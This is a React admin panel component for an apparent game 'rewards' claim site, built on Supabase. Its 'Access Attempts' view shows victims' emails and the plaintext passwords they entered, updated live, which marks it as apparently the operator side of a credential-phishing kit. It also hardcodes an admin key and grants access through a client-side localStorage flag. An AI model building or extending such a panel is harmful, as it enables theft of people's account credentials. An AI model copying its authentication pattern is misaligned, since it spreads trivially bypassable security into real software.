import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Shield, Upload, Users, Settings, LogOut, Eye } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';

interface AccessAttempt {
  id: string;
  email: string;
  passphrase: string;
  item_name: string;
  timestamp: string;
  status: 'success' | 'failed';
}

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

const AdminPanel = () => {
  const [accessAttempts, setAccessAttempts] = useState<AccessAttempt[]>([]);
  const [items, setItems] = useState<RewardItem[]>([]);
  const [selectedFiles, setSelectedFiles] = useState<{ [key: number]: File | null }>({});
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [accessKey, setAccessKey] = useState('');
  const { toast } = useToast();

  const ADMIN_ACCESS_KEY = 'Teamexemod@786';

  // Check authentication first
  useEffect(() => {
    const savedAuth = localStorage.getItem('adminAuthenticated');
    if (savedAuth === 'true') {
      setIsAuthenticated(true);
    }
  }, []);

  const handleAccessKeySubmit = () => {
    if (accessKey === ADMIN_ACCESS_KEY) {
      setIsAuthenticated(true);
      localStorage.setItem('adminAuthenticated', 'true');
      toast({
        title: "Access Granted",
        description: "Welcome to Admin Panel",
        className: "border-green-500 bg-green-50 text-green-800",
      });
    } else {
      toast({
        variant: "destructive",
        title: "Access Denied",
        description: "Invalid access key",
      });
    }
  };

  // Fetch access attempts - only if authenticated
  useEffect(() => {
    if (!isAuthenticated) return;

    const fetchAccessAttempts = async () => {
      console.log('Fetching access attempts...');
      const { data, error } = await supabase
        .from('access_attempts')
        .select('*')
        .order('timestamp', { ascending: false });
      
      if (error) {
        console.error('Error fetching access attempts:', error);
        toast({
          variant: "destructive",
          title: "Database Error",
          description: "Failed to fetch access attempts",
        });
        return;
      }
      
      console.log('Fetched access attempts:', data);
      const formattedAttempts = data?.map(attempt => ({
        ...attempt,
        status: attempt.status as 'success' | 'failed'
      })) || [];
      
      setAccessAttempts(formattedAttempts);
      console.log('Set access attempts state:', formattedAttempts);
    };

    // Initial fetch
    fetchAccessAttempts();

    // Real-time subscription for access attempts with detailed logging
    const attemptsChannel = supabase
      .channel('access-attempts-realtime-' + Date.now())
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'access_attempts'
        },
        (payload) => {
          console.log('Real-time access attempt change:', payload);
          // Refetch data on any change
          fetchAccessAttempts();
        }
      )
      .subscribe((status) => {
        console.log('Real-time subscription status:', status);
      });

    return () => {
      console.log('Cleaning up access attempts subscription');
      supabase.removeChannel(attemptsChannel);
    };
  }, [isAuthenticated, toast]);

  // Fetch items - only if authenticated
  useEffect(() => {
    if (!isAuthenticated) return;

    const fetchItems = async () => {
      const { data, error } = await supabase
        .from('items')
        .select('*')
        .order('id');
      
      if (error) {
        console.error('Error fetching items:', error);
        return;
      }
      
      setItems(data?.map(item => ({
        ...item,
        rarity: item.rarity as 'Legendary' | 'Epic' | 'Rare'
      })) || []);
    };

    fetchItems();

    // Real-time subscription for items
    const itemsChannel = supabase
      .channel('items-realtime')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'items'
        },
        () => fetchItems()
      )
      .subscribe();

    return () => {
      supabase.removeChannel(itemsChannel);
    };
  }, [isAuthenticated]);

  const handleFileSelect = (itemId: number, file: File | null) => {
    setSelectedFiles(prev => ({
      ...prev,
      [itemId]: file
    }));
  };

  const handleImageUpdate = async (itemId: number) => {
    const file = selectedFiles[itemId];
    if (!file) {
      toast({
        variant: "destructive",
        title: "No file selected",
        description: "Please select an image file first.",
      });
      return;
    }

    try {
      // Convert file to base64 or blob URL for immediate display
      const reader = new FileReader();
      reader.onload = async (e) => {
        const imageUrl = e.target?.result as string;
        
        const { error } = await supabase
          .from('items')
          .update({ image_url: imageUrl })
          .eq('id', itemId);

        if (error) throw error;

        // Clear the selected file
        setSelectedFiles(prev => ({
          ...prev,
          [itemId]: null
        }));

        toast({
          title: "Image Updated",
          description: `Item image has been updated successfully.`,
          className: "border-primary bg-card text-foreground",
        });
      };
      reader.readAsDataURL(file);
    } catch (error) {
      console.error('Error updating image:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to update image.",
      });
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem('adminAuthenticated');
    setAccessAttempts([]);
    setItems([]);
    toast({
      title: "Logged out",
      description: "You have been logged out successfully.",
    });
  };

  // Show access key input if not authenticated
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-6">
        <Card className="card-premium w-full max-w-md">
          <div className="p-8 text-center">
            <div className="w-16 h-16 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center glow-pulse mx-auto mb-6">
              <Shield className="w-8 h-8 text-primary-foreground" />
            </div>
            <h1 className="text-2xl font-bold text-primary mb-2">Admin Access Required</h1>
            <p className="text-sm text-muted-foreground mb-6">Enter your access key to continue</p>
            
            <div className="space-y-4">
              <Input
                type="password"
                placeholder="Enter access key"
                value={accessKey}
                onChange={(e) => setAccessKey(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleAccessKeySubmit()}
                className="text-center"
              />
              <Button 
                onClick={handleAccessKeySubmit}
                className="btn-royal w-full"
                disabled={!accessKey}
              >
                <Shield className="w-4 h-4 mr-2" />
                Access Admin Panel
              </Button>
            </div>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center glow-pulse">
              <Shield className="w-6 h-6 text-primary-foreground" />
            </div>
            <div>
              <h1 className="text-2xl font-bold text-primary">Admin Control Panel</h1>
              <p className="text-sm text-muted-foreground">Manage rewards and monitor access attempts</p>
            </div>
          </div>
          <Button onClick={handleLogout} variant="outline" className="border-destructive text-destructive hover:bg-destructive hover:text-destructive-foreground">
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Image Management */}
          <Card className="card-premium">
            <div className="flex items-center gap-2 mb-6">
              <Upload className="w-5 h-5 text-primary" />
              <h2 className="text-xl font-semibold text-foreground">Item Management</h2>
            </div>
            
            <div className="space-y-4">
              {items.map((item) => (
                <div key={item.id} className="flex items-center gap-4 p-4 bg-muted/30 rounded-lg">
                  <div className="w-12 h-12 rounded overflow-hidden flex-shrink-0">
                    <img 
                      src={item.image_url} 
                      alt={item.name}
                      className="w-full h-full object-cover"
                    />
                  </div>
                  <div className="flex-1">
                    <Label className="text-sm font-medium">{item.name}</Label>
                    <Input
                      type="file"
                      accept="image/*"
                      onChange={(e) => handleFileSelect(item.id, e.target.files?.[0] || null)}
                      className="mt-1 text-xs"
                    />
                  </div>
                  <Button
                    onClick={() => handleImageUpdate(item.id)}
                    size="sm"
                    className="btn-royal"
                    disabled={!selectedFiles[item.id]}
                  >
                    Update
                  </Button>
                </div>
              ))}
            </div>
          </Card>

          {/* Access Monitoring */}
          <Card className="card-premium">
            <div className="flex items-center gap-2 mb-6">
              <Eye className="w-5 h-5 text-primary" />
              <h2 className="text-xl font-semibold text-foreground">Access Attempts</h2>
            </div>
            
            <div className="space-y-3 max-h-96 overflow-y-auto">
              {accessAttempts.length > 0 ? (
                accessAttempts.map((attempt) => (
                  <div key={attempt.id} className="p-4 bg-muted/30 rounded-lg border">
                    <div className="flex items-center justify-between mb-3">
                      <span className="font-medium text-foreground text-sm">{attempt.email || 'No email'}</span>
                      <span className={`px-3 py-1 rounded-full text-xs font-semibold ${
                        attempt.status === 'success' 
                          ? 'bg-green-500/20 text-green-400 border border-green-500/30' 
                          : 'bg-red-500/20 text-red-400 border border-red-500/30'
                      }`}>
                        {attempt.status?.toUpperCase() || 'UNKNOWN'}
                      </span>
                    </div>
                    <div className="text-sm text-muted-foreground space-y-2">
                      <p><strong className="text-foreground">Item Claimed:</strong> {attempt.item_name || 'Unknown Item'}</p>
                      <p><strong className="text-foreground">Password Used:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.passphrase || 'No password'}</span></p>
                      <p><strong className="text-foreground">Attempt Time:</strong> {attempt.timestamp ? new Date(attempt.timestamp).toLocaleString() : 'Unknown time'}</p>
                    </div>
                  </div>
                ))
              ) : (
                <div className="text-center text-muted-foreground py-12">
                  <Shield className="w-12 h-12 mx-auto mb-4 opacity-50" />
                  <p className="text-lg font-medium">No access attempts yet</p>
                  <p className="text-sm">User login and claim attempts will appear here in real-time</p>
                </div>
              )}
            </div>
          </Card>
        </div>

        {/* Statistics */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-8">
           <Card className="card-premium text-center">
            <div className="p-6">
              <Users className="w-8 h-8 text-primary mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">{accessAttempts.length}</h3>
              <p className="text-sm text-muted-foreground">Total Login Attempts</p>
            </div>
          </Card>
          
          <Card className="card-premium text-center">
            <div className="p-6">
              <Shield className="w-8 h-8 text-green-400 mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">
                {accessAttempts.filter(a => a.status === 'success').length}
              </h3>
              <p className="text-sm text-muted-foreground">Successful Claims</p>
            </div>
          </Card>
          
          <Card className="card-premium text-center">
            <div className="p-6">
              <Settings className="w-8 h-8 text-primary mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">{items.length}</h3>
              <p className="text-sm text-muted-foreground">Active Items</p>
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;